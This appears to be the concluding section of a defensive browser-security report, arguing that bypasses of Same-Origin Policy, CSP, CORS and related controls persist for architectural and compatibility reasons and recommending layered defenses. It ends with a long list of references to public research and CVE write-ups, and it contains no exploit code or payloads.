Browser security bypasses persist because the browser security model is fundamentally built on **differential trust assumptions** between components that were never designed to operate together. Same-Origin Policy emerged organically from Netscape Navigator's early design decisions. CSP was grafted on decades later as a defense-in-depth mitigation. CORS was retrofitted to enable controlled cross-origin access. Each security mechanism assumes other components have already validated input, creating gaps at component boundaries.

**Why Bypasses Are Inevitable:**

1. **Parser Differentials Are Architectural**: Browsers contain dozens of parsers (URL, HTML, CSS, JavaScript, HTTP, XML, JSON, WebSocket handshake). Each parser was designed independently, often implementing different RFC versions or browser-specific quirks. When user input flows through multiple parsers, differential interpretation is structurally unavoidable. URL parser confusion vulnerabilities (CVE-2024-30043, CVE-2025-25292) demonstrate this: no amount of patching eliminates the problem because parsers were never designed for consistency.

2. **Security Policies Have Escape Hatches for Compatibility**: CSP allows 'unsafe-inline' and 'unsafe-eval' because too many sites break without them. CORS allows wildcards and null origins. SameSite defaults to Lax rather than Strict to avoid breaking legitimate cross-site navigations. document.domain persists despite being deprecated for a decade. Every escape hatch is a potential bypass vector. The web must support 30 years of existing content, and backward compatibility permanently undermines security.

3. **Browser Features Compose in Unsafe Ways**: PostMessage + iframe sandbox + window.opener + popups + service workers + extensions each seemed individually safe when designed. Their composition creates emergent vulnerabilities no single component designer anticipated. WebAuthn was designed to be phishing-resistant, but when combined with XSS (API hijacking) or IdP downgrade logic, the security guarantee evaporates. These are not implementation bugs—they are architectural composition failures.

**Why Incremental Patches Fail:**

Patching individual bypasses is similar to playing whack-a-mole. DOMPurify has patched mXSS bypasses dozens of times, yet CVE-2024-47875 emerged using namespace confusion. Google fixes one JSONP endpoint on their CDN, but attackers find another. Each CSP bypass gets mitigated, but the underlying issue—that CSP relies on whitelisting domains hosting dynamic content—remains unfixed. Differential fuzzing tools like JIT-Picker discovered 32 new JavaScript engine bugs in 2024 despite years of fuzzing investment. The attack surface is too large, and attack primitives too compositional, for patching to achieve security.

**What a Structural Solution Looks Like:**

A truly secure browser architecture would require:

1. **Process-Per-Principal Isolation**: Not just process-per-site (Site Isolation) but process-per-origin with no shared memory, no shared JavaScript heap, no shared DOM. Cross-origin communication exclusively via serialized message passing with mandatory origin verification. SharedArrayBuffer, Spectre, and side-channel attacks become impossible. (Performance cost: prohibitive for current web.)

2. **Typed Cross-Origin Channels**: Instead of PostMessage accepting arbitrary objects, a type system enforcing message schemas. Instead of CORS allowing wildcard origins, a cryptographic capability system requiring explicit per-origin grants. (Backward compatibility: breaks every existing API.)

3. **No Dynamic Evaluation**: Remove eval(), Function(), innerHTML with script injection, document.write(), setTimeout(string), and all other dynamic evaluation sinks. Require frameworks to use static templates with auto-escaping. Trusted Types is a step in this direction but remains opt-in. (Adoption: minimal; frameworks resist.)

4. **Unified Parser Architecture**: Replace dozens of independent parsers with a single canonical parser for URLs, HTML, attributes, and encoding. All components use the same parser. (Engineering cost: decade-long rewrite of browser engines.)

5. **Mandatory Security Headers with Strict Defaults**: CSP, CORS, cookies, COOP/COEP/CORP all mandatory with secure defaults (no wildcards, no unsafe-inline, SameSite=Strict). Legacy modes disabled. (Web breakage: catastrophic.)

None of these solutions are practically deployable because they break the existing web. The browser security model is fundamentally a **negotiation between security and compatibility**, and compatibility always wins. As long as browsers must execute 30-year-old JavaScript, interpret ambiguous HTML, and permit cross-origin resource sharing for ads/analytics/CDNs, browser security model bypasses will remain a permanent fixture of web security.

Defensive practitioners should assume that **isolation boundaries will be breached** and implement defense-in-depth: CSP (even imperfect) + SameSite cookies + CORS restrictions + HttpOnly + Secure flags + HSTS + frame-ancestors + input sanitization + output encoding + Trusted Types + regular dependency updates. No single control suffices; only layered defense provides resilience when (not if) individual controls are bypassed.

---

*This document was created for defensive security research and vulnerability understanding purposes. All techniques described are based on publicly disclosed research, CVE reports, and security conference presentations from 2024-2025.*

---

## References

1. [What is CVE-2024-44308 (XSS), and How to Protect From It | Jit](https://www.jit.io/resources/app-security/what-is-cve-2024-44308-xss-and-how-to-protect-from-it)
2. [CVE-2025-9866: Chromium Extensions CSP Bypass and Patch Guide | Windows Forum](https://windowsforum.com/threads/cve-2025-9866-chromium-extensions-csp-bypass-and-patch-guide.379806/)
3. [What are the critical vulnerabilities fixed in Firefox 141 | Web Asha Technologies](https://www.webasha.com/blog/what-are-the-critical-vulnerabilities-fixed-in-firefox-141-and-why-should-you-update-immediately)
4. [CORS Misconfigurations: Advanced Exploitation Guide | Intigriti](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities)
5. [PostMessage Vulnerabilities: When Cross-Window Communication Goes Wrong | InstaTunnel](https://medium.com/@instatunnel/postmessage-vulnerabilities-when-cross-window-communication-goes-wrong-4c82a5e8da63)
6. [CVE-2024-49038: postmessaged-and-compromised | Microsoft MSRC](https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised)
7. [Content Security Policy (CSP) Bypass | HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)
8. [Bypassing SameSite cookie restrictions | Web Security Academy](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
9. [Clickjacking Defense - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
10. [Cross-Site WebSocket Hijacking Exploitation in 2025 | Include Security](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
11. [CVE-2024-55591: Authentication bypass in Node.js websocket module | Integrity360](https://insights.integrity360.com/cve-2024-55591-being-exploited-in-the-wild-critical-authentication-bypass-in-node.js-websocket-module)
12. [SLAP and FLOP: Apple's Lack of Full Site Isolation | Open Web Advocacy](https://open-web-advocacy.org/blog/slap-and-flop--apples-lack-of-full-site-isolation-and-ios-browser-ban-puts-users-at-risk/)
13. [A Study on Malicious Browser Extensions in 2025 | arXiv](https://arxiv.org/html/2503.04292v2)
14. [Chrome Extension Supply Chain Attack | InstaTunnel](https://medium.com/@instatunnel/chrome-extension-supply-chain-attack-when-your-dev-tools-turn-malicious-e1d4984a7373)
15. [Top 10 web hacking techniques of 2025 | PortSwigger Research](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025)
16. [Top 10 web hacking techniques of 2024 | PortSwigger Research](https://portswigger.net/research/top-10-web-hacking-techniques-of-2024)
17. [DOM clobbering | Web Security Academy](https://portswigger.net/web-security/dom-based/dom-clobbering)
18. [Bypassing CSP via DOM clobbering | PortSwigger Research](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
19. [Security Study of Service Worker Cross-Site Scripting | ACM](https://dl.acm.org/doi/fullHtml/10.1145/3427228.3427290)
20. [Sec-Fetch and Client Hints inconsistencies in headless browsers | SicuraNext](https://blog.sicuranext.com/sec-fetch-and-client-hints-a-powerful-tool-against-automation/)
21. [Why you need "cross-origin isolated" for powerful features | web.dev](https://web.dev/articles/why-coop-coep)
22. [HSTS bypass and SSL stripping | Hak5 Forums](https://forums.hak5.org/topic/37642-hsts-bypass-and-ssl-stripping/)
23. [Mitigate DOM-based XSS with Trusted Types | Chrome for Developers](https://developer.chrome.com/docs/lighthouse/best-practices/trusted-types-xss)
24. [Prevent DOM-based cross-site scripting with Trusted Types | web.dev](https://web.dev/trusted-types/)
25. [Stealing oAuth Token via Referrer Policy Override | Voorivex](https://blog.voorivex.team/leaking-oauth-token-via-referrer-leakage)
26. [Web cache poisoning | Web Security Academy](https://portswigger.net/web-security/web-cache-poisoning)
27. [Internet's Invisible Enemy: Detecting Web Cache Poisoning | ACM CCS 2024](https://dl.acm.org/doi/10.1145/3658644.3690361)
28. [URL Confusion Vulnerabilities in the Wild | Snyk](https://snyk.io/blog/url-confusion-vulnerabilities/)
29. [CVE-2024-30043: Abusing URL Parsing Confusion on SharePoint | ZDI](https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud)
30. [Security Implications of URL Parsing Differentials | Sonar](https://www.sonarsource.com/blog/security-implications-of-url-parsing-differentials/)
31. [Dangling markup injection | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
32. [Evading CSP with DOM-based dangling markup | PortSwigger Research](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
33. [Bypassing DOMPurify with mutation XSS | PortSwigger Research](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
34. [CVE-2024-47875: DOMPurify mXSS Vulnerability | CVE News](https://www.cve.news/cve-2024-47875/)
35. [mXSS: The Vulnerability Hiding in Your Code | Sonar](https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/)
36. [Lab: DOM XSS via client-side prototype pollution | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)
37. [Widespread prototype pollution gadgets | PortSwigger Research](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
38. [Removing XSLT for a more secure browser | Chrome for Developers](https://developer.chrome.com/docs/web-platform/deprecating-xslt)
39. [Sandbox-iframe XSS challenge solution | Johan Carlsson](https://joaxcar.com/blog/2024/05/16/sandbox-iframe-xss-challenge-solution/)
40. [Escaping Improperly Sandboxed Iframes | Daniel Dušek](https://danieldusek.com/escaping-improperly-sandboxed-iframes.html)
41. [CVE-2024-5691: Iframe sandbox bypass via clickjacking | Mozilla Bugzilla](https://bugzilla.mozilla.org/show_bug.cgi?id=1888695)
42. [Passkey Login Bypassed via WebAuthn Process Manipulation | SecurityWeek](https://www.securityweek.com/passkey-login-bypassed-via-webauthn-process-manipulation/)
43. [How Attackers Bypass Synced Passkeys | The Hacker News](https://thehackernews.com/2025/10/how-attackers-bypass-synced-passkeys.html)
44. [CVE-2025-26788: Passkey Authentication Bypass in StrongKey FIDO Server | Securing](https://www.securing.pl/en/cve-2025-26788-passkey-authentication-bypass-in-strongkey-fido-server/)
45. [CVE-2024-9956: WebAuthentication Vulnerability in Chrome Android | OffSec](https://www.offsec.com/blog/cve-2024-9956/)
46. [WebAuthn Logic Flaws | InstaTunnel](https://medium.com/@instatunnel/the-webauthn-loop-common-logic-flaws-in-the-passwordless-handshake-017065517f83)
47. [Passkeys Pwned: Turning WebAuthn Against Itself | SquareX Labs](https://labs.sqrx.com/passkeys-pwned-turning-webauth-against-itself-0dbddb7ade1a)
48. [Chrome Extensions Vulnerability Exposes API Keys | Cybersecurity News](https://cybersecuritynews.com/chrome-extensions-vulnerability-exposes-api-keys/)
49. [Same Origin Method Execution (SOME) | Ben Hayak](https://www.benhayak.com/2015/06/same-origin-method-execution-some.html)
50. [Bypass CSP Using WordPress by Abusing Same Origin Method Execution | Octagon](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)
51. [Harvesting Browser Credentials: DPAPI Exploitation | HawkEye](https://hawk-eye.io/2025/08/harvesting-browser-credentials-the-dpapi-exploitation-threat/)
52. [JIT-Ppcking: differential fuzzing of JavaScript engines | RUB-Repository](https://hss-opus.ub.ruhr-uni-bochum.de/opus4/frontdoor/index/index/year/2024/docId/10992)
53. [New HTTP/2 Vulnerability Exposes Web Servers to DoS | The Hacker News](https://thehackernews.com/2024/04/new-http2-vulnerability-exposes-web.html)
54. [New Vulnerability Bypasses HTTP/2 Security and Launches XSS | CyberPress](https://cyberpress.org/new-vulnerability-allows-hackers-to-bypass-http-2-security/)
55. [HTTP/3 connection contamination | PortSwigger Research](https://portswigger.net/research/http-3-connection-contamination)
56. [Exploiting HTTP/2 CONTINUATION frames for DoS | Snyk](https://snyk.io/blog/exploiting-http-2-continuation-frames-dos-attacks/)
57. [Burp Suite vs. OWASP ZAP | PyNT](https://www.pynt.io/learning-hub/burp-suite-guides/burp-suite-vs-zap-features-key-differences-limitations)
58. [The State of Browser Security Report 2025 | Keep Aware](https://keepaware.com/resources/guides/state-of-browser-security-report-2025)
59. [Browser Security Landscape Transformed in 2025 | Security Boulevard](https://securityboulevard.com/2025/06/browser-security-landscape-transformed-in-2025/)
60. [Looking back at our Bug Bounty program in 2024 | Meta Engineering](https://engineering.fb.com/2025/02/13/security/looking-back-at-our-bug-bounty-program-in-2024/)
61. Ben Hayak — "Same Origin Method Execution (SOME)" (DEF CON 2015): JSONP callback endpoints abused to invoke arbitrary same-origin JavaScript methods, bypassing CSP. Reapplied in octagon.net WordPress CSP bypass (2022).
62. GitHub — "GitHub's post-CSP journey" (Mike West & GitHub Security, 2017): Documents the iterative real-world deployment of CSP on a large-scale production application — migrating from whitelist-based CSP to nonce-based policy, adopting `strict-dynamic`, eliminating `unsafe-inline`, and addressing breakage from third-party scripts. A key case study demonstrating that CSP deployment is a multi-phase operational challenge, not a one-time header addition.
63. Wi et al. — "DiffCSP: Finding Browser Bugs in Content Security Policy Enforcement through Differential Testing" (NDSS 2023): First differential testing framework for CSP enforcement; 29 security bugs across Chrome/Firefox/Safari; 10 root cause categories; https://github.com/WSP-LAB/DiffCSP
64. [Fickle PDFs: exploiting browser rendering discrepancies | PortSwigger Research](https://portswigger.net/research/fickle-pdfs-exploiting-browser-rendering-discrepancies) — Zakhar Fedotkin (2024): PDF widget annotations render differently across browsers (Safari vs Chrome vs Firefox), enabling financial document fraud and AI-human discrepancy attacks from a single unmodified file.
